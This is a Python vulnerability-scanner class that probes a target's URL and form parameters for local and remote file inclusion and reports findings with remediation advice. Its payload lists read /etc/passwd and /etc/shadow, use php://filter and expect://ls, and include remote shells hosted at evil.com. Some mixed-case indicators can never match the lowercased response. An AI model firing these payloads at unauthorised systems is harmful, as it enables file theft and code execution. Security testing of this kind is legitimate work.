# base/scanners/web/lfi_rfi_scanner.py
import asyncio
import aiohttp
from typing import Dict, List
from urllib.parse import urlparse, urlencode, parse_qs

from ..base import BaseScanner, Vulnerability

class LFI_RFIScanner(BaseScanner):
    """Local/Remote File Inclusion vulnerability scanner"""
    
    def __init__(self, target: str, config: Dict = None):
        super().__init__(target, config)
        
        # LFI payloads
        self.lfi_payloads = [
            '../../../../etc/passwd',
            '..\\..\\..\\..\\windows\\win.ini',
            '../../../../etc/shadow',
            '../../../../etc/hosts',
            '../../../../etc/issue',
            '....//....//....//etc/passwd',
            '..;/..;/..;/etc/passwd',
            'file:///etc/passwd',
            'php://filter/convert.base64-encode/resource=index.php',
            'php://filter/read=string.rot13/resource=index.php',
            'expect://ls',
            '/etc/passwd',
            'C:\\Windows\\win.ini'
        ]
        
        # RFI payloads
        self.rfi_payloads = [
            'http://evil.com/shell.txt?',
            'https://evil.com/shell.php',
            'ftp://evil.com/shell.txt',
            'data:text/plain,<?php phpinfo(); ?>',
            'data:text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg=='
        ]
        
        # Expected indicators
        self.indicators = {
            'passwd': ['root:', 'daemon:', 'bin:', 'sys:'],
            'win.ini': ['[fonts]', '[extensions]', '[mci extensions]'],
            'phpinfo': ['PHP Version', 'phpinfo()', 'PHP License'],
            'error': ['Warning:', 'Fatal error', 'failed to open stream']
        }
    
    async def scan(self) -> 'ScanResult':
        """Scan for LFI/RFI vulnerabilities"""
        
        # Find all parameters
        params = await self._find_parameters()
        
        # Test each parameter
        for param_info in params:
            await self._test_parameter(param_info)
        
        return self.result
    
    async def _find_parameters(self) -> List[Dict]:
        """Find all potential file inclusion parameters"""
        params = []
        
        # Check URL parameters
        parsed = urlparse(self.target)
        if parsed.query:
            query_params = parse_qs(parsed.query)
            for param_name in query_params.keys():
                params.append({
                    'type': 'url',
                    'name': param_name,
                    'url': self.target,
                    'original_value': query_params[param_name][0]
                })
        
        # Check forms
        for form in self.result.forms:
            for input_field in form.get('inputs', []):
                if input_field.get('type') in ['text', 'hidden', 'file']:
                    params.append({
                        'type': 'form',
                        'name': input_field['name'],
                        'form': form,
                        'original_value': ''
                    })
        
        return params
    
    async def _test_parameter(self, param_info: Dict):
        """Test a single parameter for LFI/RFI"""
        
        # Test LFI payloads
        for payload in self.lfi_payloads:
            result = await self._send_payload(param_info, payload)
            if result and await self._check_lfi_success(result, payload):
                await self._report_lfi(param_info, payload)
        
        # Test RFI payloads
        for payload in self.rfi_payloads:
            result = await self._send_payload(param_info, payload)
            if result and await self._check_rfi_success(result, payload):
                await self._report_rfi(param_info, payload)
    
    async def _send_payload(self, param_info: Dict, payload: str) -> str:
        """Send payload to parameter"""
        try:
            async with aiohttp.ClientSession() as session:
                if param_info['type'] == 'url':
                    # Modify URL parameter
                    parsed = urlparse(param_info['url'])
                    params = parse_qs(parsed.query)
                    params[param_info['name']] = [payload]
                    
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(params, doseq=True)}"
                    
                    async with session.get(test_url, ssl=False) as response:
                        return await response.text()
                
                elif param_info['type'] == 'form':
                    # Submit form with payload
                    form = param_info['form']
                    action = form.get('action', '')
                    if not action.startswith('http'):
                        action = self.target.rstrip('/') + '/' + action.lstrip('/')
                    
                    data = {}
                    for input_field in form.get('inputs', []):
                        if input_field['name'] == param_info['name']:
                            data[input_field['name']] = payload
                        else:
                            data[input_field['name']] = 'test'
                    
                    method = form.get('method', 'post').lower()
                    if method == 'post':
                        async with session.post(action, data=data, ssl=False) as response:
                            return await response.text()
                    else:
                        async with session.get(action, params=data, ssl=False) as response:
                            return await response.text()
                            
        except Exception as e:
            self.logger.debug(f"Payload failed: {str(e)}")
        
        return ''
    
    async def _check_lfi_success(self, response: str, payload: str) -> bool:
        """Check if LFI was successful"""
        response_lower = response.lower()
        
        # Check for file content indicators
        for indicator_type, patterns in self.indicators.items():
            if any(pattern in response_lower for pattern in patterns):
                return True
        
        # Check for error messages that might indicate inclusion
        if 'no such file' in response_lower:
            return False  # File doesn't exist, but inclusion attempted
        
        if 'failed to open stream' in response_lower:
            return True  # PHP error indicates file inclusion attempted
        
        return False
    
    async def _check_rfi_success(self, response: str, payload: str) -> bool:
        """Check if RFI was successful"""
        # Check for execution of remote code
        if 'phpinfo' in response and 'PHP Version' in response:
            return True
        
        # Check for our test string
        if 'remote_code_execution' in response:
            return True
        
        return False
    
    async def _report_lfi(self, param_info: Dict, payload: str):
        """Report LFI vulnerability"""
        
        vuln = Vulnerability(
            name="Local File Inclusion (LFI)",
            description="Application is vulnerable to Local File Inclusion",
            severity="high",
            cvss_score=7.5,
            cwe_id="CWE-98",
            affected_component="File Inclusion Mechanism",
            remediation="Validate and sanitize file paths, use whitelist approach",
            evidence=f"Parameter: {param_info['name']}\nPayload: {payload}",
            proof_of_concept=f"Access: {self.target}?{param_info['name']}={payload}",
            references=[
                "https://owasp.org/www-community/attacks/File_Inclusion",
                "https://cwe.mitre.org/data/definitions/98.html"
            ],
            tags=['lfi', 'file-inclusion']
        )
        
        self.add_vulnerability(vuln)
    
    async def _report_rfi(self, param_info: Dict, payload: str):
        """Report RFI vulnerability"""
        
        vuln = Vulnerability(
            name="Remote File Inclusion (RFI)",
            description="Application is vulnerable to Remote File Inclusion",
            severity="critical",
            cvss_score=9.0,
            cwe_id="CWE-98",
            affected_component="File Inclusion Mechanism",
            remediation="Disable remote file inclusion, validate and sanitize input",
            evidence=f"Parameter: {param_info['name']}\nPayload: {payload}",
            proof_of_concept=f"Access: {self.target}?{param_info['name']}={payload}",
            references=[
                "https://owasp.org/www-community/attacks/File_Inclusion",
                "https://cwe.mitre.org/data/definitions/98.html"
            ],
            tags=['rfi', 'file-inclusion']
        )
        
        self.add_vulnerability(vuln)